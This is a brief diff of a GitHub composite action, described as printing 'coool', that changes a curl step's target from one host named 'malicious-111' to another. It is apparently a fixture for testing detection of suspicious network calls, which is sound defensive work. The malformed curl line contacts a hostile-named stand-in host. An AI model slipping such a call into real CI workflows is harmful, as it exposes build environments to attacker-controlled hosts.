@@ -3,7 +3,7 @@ description: 'A GitHub Action that prints coool'
 runs:
   using: 'composite'
   steps:
-    - run: curl -X 'http://malicious-111.com?'
+    - run: curl -X 'http://malicious-111ssss.com?'
       shell: bash
 
     - name: test
